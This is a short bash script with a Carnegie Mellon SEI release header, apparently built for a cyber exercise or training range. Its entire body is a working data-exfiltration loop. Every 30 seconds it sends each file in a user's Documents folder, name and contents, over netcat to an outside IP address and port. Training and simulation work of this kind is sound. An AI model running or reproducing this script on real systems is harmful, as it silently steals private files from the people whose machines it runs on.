#!/bin/bash
#
# Copyright 2025 Carnegie Mellon University.
#
# NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING INSTITUTE MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON UNIVERSITY MAKES NO WARRANTIES OF ANY KIND, EITHER EXPRESSED OR IMPLIED, AS TO ANY MATTER INCLUDING, BUT NOT LIMITED TO, WARRANTY OF FITNESS FOR PURPOSE OR MERCHANTABILITY, EXCLUSIVITY, OR RESULTS OBTAINED FROM USE OF THE MATERIAL. CARNEGIE MELLON UNIVERSITY DOES NOT MAKE ANY WARRANTY OF ANY KIND WITH RESPECT TO FREEDOM FROM PATENT, TRADEMARK, OR COPYRIGHT INFRINGEMENT.
#
# Licensed under a MIT (SEI)-style license, please see license.txt or contact permission@sei.cmu.edu for full terms.
#
# [DISTRIBUTION STATEMENT A] This material has been approved for public release and unlimited distribution.  Please see Copyright notice for non-US Government use and distribution.
#
# This Software includes and/or makes use of Third-Party Software each subject to its own license.
# DM25-0166#


# Variables
NC_SERVER="123.45.67.100"
NC_PORT=12345
FILE_DIR="/home/user/Documents"
INTERVAL=30  # Interval in seconds

while true; do
    # Loop through all files in the directory
    for FILE in "$FILE_DIR"/*; do
        if [ -f "$FILE" ]; then
            # Extract the filename
            FILENAME=$(basename "$FILE")
            echo "Sending $FILENAME..."
            # Send the filename first, then the contents
            echo "$FILENAME" | nc $NC_SERVER $NC_PORT -q 0
            sleep 1
            cat "$FILE" | nc $NC_SERVER $NC_PORT -q 0
            sleep 1
        fi
    done
    
    # Wait for the specified interval before sending the files again
    sleep $INTERVAL
done
